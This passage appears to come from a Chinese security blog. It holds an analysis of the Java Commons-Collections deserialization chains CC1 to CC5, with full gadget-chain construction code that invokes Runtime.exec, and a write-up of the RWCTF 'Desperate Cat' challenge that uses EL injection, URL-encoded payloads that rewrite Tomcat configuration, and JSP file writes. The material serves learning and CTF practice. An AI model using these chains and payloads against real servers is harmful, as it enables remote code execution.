将代理对象封装到AnnotationInvocationHandler中</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> clazz1.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler1</span> <span class="operator">=</span> (InvocationHandler) constructor2.newInstance(Override.class,map);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:/cc3.poc&quot;</span>));</span><br><span class="line">objectOutputStream.writeObject(invocationHandler1);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:/cc3.poc&quot;</span>));</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%201.png" alt="Untitled"></p>
<h2 id="三、CommonsCollection2链"><a href="#三、CommonsCollection2链" class="headerlink" title="三、CommonsCollection2链"></a>三、CommonsCollection2链</h2><p>  在CC2链中，导入的是commons-collections4:4.0这个包。它最终利用到的也是TemplatesImpl来加载恶意字节码。因此我们只需要关注前面构造的部分，最终是如何调用到TemplatesImpl.newTransformer方法或者TemplatesImpl.getOutputProperties方法的。</p>
<p>  在TransformingComparator.compare方法中，调用了this.transformer.transform方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">	<span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">  <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  因此在向上追溯的时候，我们只需要关注哪个地方调用了compare方法。在CC2链中，反序列化的入口点选的是PriorityQueue这个类，从该类的readObject方法触发，通过调用heapify()→siftDownUsingComparator()→comparator.compare()，最终调用到TransformingComparator.compare方法，因此我们构造的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">3</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer));</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] objects = (Object[]) queue.get(priorityQueue);</span><br><span class="line">objects[<span class="number">0</span>] = object;</span><br><span class="line">objects[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">iMethod</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">iMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iMethod.set(invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  这里调用add去添加元素，是为了构造size；另外在构造POC的时候，需要通过反射方式去改变InvokerTransformer中的iMethodName属性值，这是由于在调用add的时候，最终会执行到InvokerTransformer.transform方法，调用添加的那个元素的某个方法；（查看堆栈信息调用链可以了解到这部分内容）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%202.png" alt="Untitled"></p>
<h2 id="四、CommonsCollection4链"><a href="#四、CommonsCollection4链" class="headerlink" title="四、CommonsCollection4链"></a>四、CommonsCollection4链</h2><p>  CC4链是CC2链的变种，和CC3一样，它用InstantiateTransformer类来替换InvokerTransformer，然后配合前面说到的com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter这个类，在调用了其构造方法之后，执行TemplatesImlp.newTransformer方法，从而加载恶意字节码信息。</p>
<p>  CC4链前半部分内容基本和CC2相似，反序列化的入口点都是PriorityQueue.readObject；只不过在CC2链中，是直接调用了InvokerTransformer.transform方法来执行TemplatesImlp.newTransformer，而在本条链中，我们需要借助ChainedTransformer方法；（这部分的构造和CC3链相似），因此可以构造如下代码：（理想情况下）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImp&#125;</span><br><span class="line">               )</span><br><span class="line">       &#125;</span><br><span class="line">);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">3</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer));</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  但是这样构造，在下面调用add函数的时候会出错；因此我们还是和上面一样，先构造一个正常的，然后在调用add函数之后，利用反射的方式去修改具体的值，最后的构造代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(constantTransformer,instantiateTransformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">3</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer));</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">iconstant</span> <span class="operator">=</span> constantTransformer.getClass().getDeclaredField(<span class="string">&quot;iConstant&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">iParam</span> <span class="operator">=</span> instantiateTransformer.getClass().getDeclaredField(<span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">iArgs</span> <span class="operator">=</span> instantiateTransformer.getClass().getDeclaredField(<span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line">iconstant.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iParam.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iArgs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">iconstant.set(constantTransformer, TrAXFilter.class);</span><br><span class="line">Object[] iparam = (Object[]) iParam.get(instantiateTransformer);</span><br><span class="line">Object[] iargs = (Object[]) iArgs.get(instantiateTransformer);</span><br><span class="line">iparam[<span class="number">0</span>] = Templates.class;</span><br><span class="line">iargs[<span class="number">0</span>] = templatesImp;</span><br></pre></td></tr></table></figure>

<h2 id="五、CommonsCollection5链"><a href="#五、CommonsCollection5链" class="headerlink" title="五、CommonsCollection5链"></a>五、CommonsCollection5链</h2><p>  CC5的利用有一定的限制，它要求JDK版本是8u76并且没有Security Manager；CC5的构造比较简单，核心利用的还是LazyMap，和CC1相同，只不过将反序列化的入口点更改了。</p>
<p>  在CC1中，调用LazyMap.get方法，是在AnnotationInvocationHandler.invoke中进行调用的，这里用到了动态代理的技术。而在CC5这条链中，借助了两个类，一个是TiedMapEntry，另一个是BadAttributeValueExpException；该链的入口点是BadAttributeValueExpException.readObject方法，在这其中，控制变量值，让其调用到TiedMapEntry.toString方法，进行进入到其getValue方法，调用了map的get方法，完成了整条链的拼接。CC5前半部分的调用链如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">   TiedMapEntry.toString()</span><br><span class="line">      TiedMapEntry.getValue()</span><br><span class="line">         LazyMap.get()</span><br></pre></td></tr></table></figure>

<p>  前面说到该条链的利用需要没有Security Manager，其实在BadAttributeValueExpException.readObject方法中就可以很直观的看到。由于该链前面部分比较简单，因此我们可以直接利用CC1链中构造好的LazyMap对象来构造此链，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                constantTransformer,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(tiedMapEntry);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:/cc5.poc&quot;</span>));</span><br><span class="line">objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:/cc5.poc&quot;</span>));</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%203.png" alt="Untitled"></p>
<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>​    CC1链中用到的AnnotationInvocationHandler入口需要JDK版本7；总的来说，这几条链都会用到几个核心的构造链，比如TemplateImpl，或者transform；在后续分析CC6和CC7的时候，其实调用链很简单，只不过在构造payload的时候，需要注意一些细节的东西，因此在后续分析中这两条链的时候，会详细看看细节部分。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/" data-id="cl8h223ib000ab3dp7wll25rg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-RWCTF 4th Desperate Cat 赛题学习与复现" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2022-02-11T09:18:42.000Z" itemprop="datePublished">2022-02-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">RWCTF 4th Desperate Cat 赛题学习与复现</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="RWCTF-4th-Desperate-Cat-赛题学习与复现"><a href="#RWCTF-4th-Desperate-Cat-赛题学习与复现" class="headerlink" title="RWCTF 4th Desperate Cat 赛题学习与复现"></a>RWCTF 4th Desperate Cat 赛题学习与复现</h1><p>前言：从一道<code>Java</code>赛题，可以学到很多知识，不论是开发相关，还是漏洞相关，都获益匪浅。本文从零开始，对此赛题做一个复现以及相关知识的学习与总结。</p>
<h2 id="一、基础知识学习"><a href="#一、基础知识学习" class="headerlink" title="一、基础知识学习"></a>一、基础知识学习</h2><p>​    虽然有了解过<code>Java Web</code>开发知识，但对于一些细节知识以及一些运行的机制并不是很了解，导致在面对一个应用的时候，攻击面会变得很窄。</p>
<p>​    本题涉及的知识点有<code>EL</code>表达式、<code>Tomcat</code>中<code>Session</code>文件的存储以及如何让<code>Tomcat</code>正常停止或者重启服务。接下来先单独地学习一下各部分知识点。</p>
<h3 id="1、EL表达式注入"><a href="#1、EL表达式注入" class="headerlink" title="1、EL表达式注入"></a>1、<code>EL</code>表达式注入</h3><p>​    在<code>JSP</code>页面中，一般会使用<code>&lt;%...%&gt;</code>来嵌入代码片段，或者使用<code>&lt;%=表达式 %&gt;</code>。（在看出题师傅的文章的时候，学到一个新的知识，就是<code>&lt;%...%&gt;</code>中的内容如果是<code>Unicode</code>编码形式的字符串，<code>Java</code>代码编译解析器也会对其进行解析）</p>
<p>​    而<code>EL</code>全称为<code>Expression Language</code>，一般用于替换<code>JSP</code>页面中的脚本表达式，它可以用于获取数据、执行运算、获取对象、调用方法。</p>
<p>​    从<code>web.xml 2.4</code> 规范版本开始后，默认都是支持<code>EL</code>的。<code>EL</code>表达式的语法比较简单，也就是<code>$&#123;内容&#125;</code>。</p>
<p>​    比如<strong>获取数据</strong>，可以使用<code>$&#123;name&#125;</code>，这样实质调用的是<code>pageContext.findAttribute(&quot;name&quot;)</code>，并分别从<code>page</code>、<code>request</code>、<code>session</code>、<code>application</code>四个域中去查找相应的对象，如果没有找到，就返回一个空字符串。如果想要获取某个对象里面的属性值，可以使用<code>.</code>这个标识符，例如<code>$&#123;Person.name&#125;</code>表示获取<code>Person</code>这个对象的<code>name</code>属性值，其实质是调用的类<code>get</code>方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Person person = new Person();</span><br><span class="line">    person.name = &quot;m1sn0w&quot;;</span><br><span class="line">    person.age = 18;</span><br><span class="line">    request.setAttribute(&quot;Person&quot;,person);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;p&gt;$&#123;Person.name&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>​    <code>EL</code>表达式中也可以执行运算，还可以用于获取<code>Web</code>开发中常用的对象，比如<code>pageContext</code>对象，其对应<code>JSP</code>页面中的<code>pageContext</code>对象；<code>param</code>对象，对应保存用户请求参数<code>map</code>对象。例如<code>$&#123;param.name&#125;</code>，当我们传入<code>name</code>参数的时候，页面就会显示字符串出来。</p>
<p>​    在<code>EL</code>规则里默认会引入<code>java.lang.*</code>下的包，因此，如果存在一个<code>EL</code>表达式注入的漏洞点，我们就可以直接使用<code>Runtime</code>来执行命令，例如<code>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;</code>；还有一些其他的利用方式，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;	# 获取web路径</span><br></pre></td></tr></table></figure>

<h3 id="2、Tomcat持久化Session"><a href="#2、Tomcat持久化Session" class="headerlink" title="2、Tomcat持久化Session"></a>2、<code>Tomcat</code>持久化<code>Session</code></h3><p>​    <code>Session</code>如果保存在内存里面，当服务器重启或者宕机之后，<code>Session</code>就会丢失。因此有时候就需要将<code>Session</code>持久化存放到磁盘上面。这里也很容易想到序列化，毕竟序列化数据的一个作用就是用来持久化操作的。因此，<code>Session</code>中存放的对象就必须是可序列化的，也就是需要是实现<code>java.io.Serializable</code>接口。</p>
<p>​    <code>Tomcat</code>默认是启动了持久化配置的，<code>Session</code>的持久化是由<code>Session Manager</code>来进行管理的。<code>Tomcat</code>提供了两个实现类，一个是<code>org.apache.catalina.session.StandardManager</code>，另外一个是<code>org.apache.catalina.session.PersistentManager</code>，可以通过配置来选择哪种方式进行持久化。</p>
<p>​    <code>StandardManager</code>是默认的<code>Session Manager</code>，当<code>Tomcat</code>服务器关闭或重启，或者<code>Web</code>应用被重新加载时，会对在内存中的<code>HttpSession</code>对象进行持久化， 并把它们保存到文件系统中，默认的文件为<code>&lt;CATALINA_HOME&gt;/work/Catalina/hostname/ applicationname/SESSIONS.ser</code>，如果突然终止服务器，则所有会话都将丧失，因为<code>StandardManager</code>没有机会实现存盘处理。</p>
<h3 id="3、如何让Tomcat-reload部署的程序"><a href="#3、如何让Tomcat-reload部署的程序" class="headerlink" title="3、如何让Tomcat reload部署的程序"></a>3、如何让<code>Tomcat reload</code>部署的程序</h3><p>​    让<code>Tomcat</code>部署的程序进行<code>reload</code>需要满足两个条件，一个是<code>Context reloadable</code>配置为<code>true</code>，但在默认情况下为<code>false</code>，第二个条件就是部署的项目<code>/WEB-INF/classes/</code>下已加载的<code>class</code>文件发生变化或者<code>/WEB-INF/lib/</code>目录下<code>jar</code>文件发生改变。</p>
<h2 id="二、赛题复现"><a href="#二、赛题复现" class="headerlink" title="二、赛题复现"></a>二、赛题复现</h2><p>​    按照题目的设置，简单编写一个示例来进行演示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package com.example.tomcatweb;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.nio.charset.StandardCharsets;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span><br><span class="line">public class HelloServlet extends HttpServlet &#123;</span><br><span class="line">    private String message;</span><br><span class="line"></span><br><span class="line">    public void init() &#123;</span><br><span class="line">        message = &quot;Hello World!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">        String data = request.getParameter(&quot;content&quot;);</span><br><span class="line">        String PreDirtyData = &quot;asdsad11e12easdxcklc&quot;;</span><br><span class="line">        String LastDirtyData = &quot;Adzxckjapepoe&quot;;</span><br><span class="line">        data = PreDirtyData + data + LastDirtyData;</span><br><span class="line">        String Route = request.getParameter(&quot;route&quot;);</span><br><span class="line">        File file = new File(Route);</span><br><span class="line">        byte[] Contents = data.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(file);</span><br><span class="line">        fileOutputStream.write(Contents);</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(&quot;文件写入位置&quot; + Route);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    代码的功能就是接受两个参数，一个是<code>content</code>参数用来定义写入文件的内容，一个是<code>route</code>参数用来定义文件的存放位置。</p>
<p>​    按照出题师傅的思路，我们首先需要将<code>Session</code>持久化文件的后缀以及位置进行修改，并且将恶意的代码添加到<code>Session</code>中。这样做的目的是当程序重新加载之后，程序就会将恶意的代码写入指定位置并且解析成<code>jsp</code>文件。</p>
<p>​    接下来就是要动态地开启<code>reload</code>配置选项，因为默认值为<code>false</code>。最后一步就是修改<code>tomcat</code>的<code>appBase</code>路径，这样做是因为写入的<code>jar</code>文件不合法，在<code>reload</code>之后，原本的项目就会出错，虽然此时<code>session.jsp</code>文件已经写入，但是没有办法访问。（当<code>appBase</code>设置为<code>/</code>时，可以通过<code>tomcat</code>来访问<code>Linux</code>下的任何文件，比如<code>/etc/passwd</code>）</p>
<p>​    因此第一次发送的请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=%24%7b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%2e%63%6c%61%73%73%4c%6f%61%64%65%72%2e%72%65%73%6f%75%72%63%65%73%2e%63%6f%6e%74%65%78%74%2e%6d%61%6e%61%67%65%72%2e%70%61%74%68%6e%61%6d%65%3d%70%61%72%61%6d%2e%61%7d%0a%24%7b%73%65%73%73%69%6f%6e%53%63%6f%70%65%5b%70%61%72%61%6d%2e%62%5d%3d%70%61%72%61%6d%2e%63%7d%0a%24%7b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%2e%63%6c%61%73%73%4c%6f%61%64%65%72%2e%72%65%73%6f%75%72%63%65%73%2e%63%6f%6e%74%65%78%74%2e%72%65%6c%6f%61%64%61%62%6c%65%3d%74%72%75%65%7d%0a%24%7b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%2e%63%6c%61%73%73%4c%6f%61%64%65%72%2e%72%65%73%6f%75%72%63%65%73%2e%63%6f%6e%74%65%78%74%2e%70%61%72%65%6e%74%2e%61%70%70%42%61%73%65%3d%70%61%72%61%6d%2e%64%7d&amp;route=/usr/local/tomcat/webapps/tomcat-web-1.0-SNAPSHOT/1.jsp</span><br></pre></td></tr></table></figure>

<p>​    接下来访问<code>1.jsp</code>，写入恶意代码并设置<code>session</code>持久化文件的位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.jsp?a=/tmp/session.jsp&amp;b=name&amp;c=&lt;%out.println(7904295)%&gt;&amp;d=/</span><br></pre></td></tr></table></figure>

<p>​    之后再随便写入一个<code>jar</code>文件到<code>WEB-INF/lib/</code>目录下面，即可导致整个程序的<code>reload</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=123&amp;route=/usr/local/tomcat/webapps/tomcat-web-1.0-SNAPSHOT/WEB-INF/lib/1.jar</span><br></pre></td></tr></table></figure>

<p>​    最后在根目录访问<code>/tmp/session.jsp</code>即可触发代码：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220211171503900.png" alt="image-20220211171503900"></p>
<h2 id="三、参考链接"><a href="#三、参考链接" class="headerlink" title="三、参考链接"></a>三、参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/267124#h2-7">https://www.anquanke.com/post/id/267124#h2-7</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/" data-id="cl8h223hz0004b3dp92urahc9" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-JDBC反序列化漏洞分析&amp;POC编写" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&POC%E7%BC%96%E5%86%99/" class="article-date">
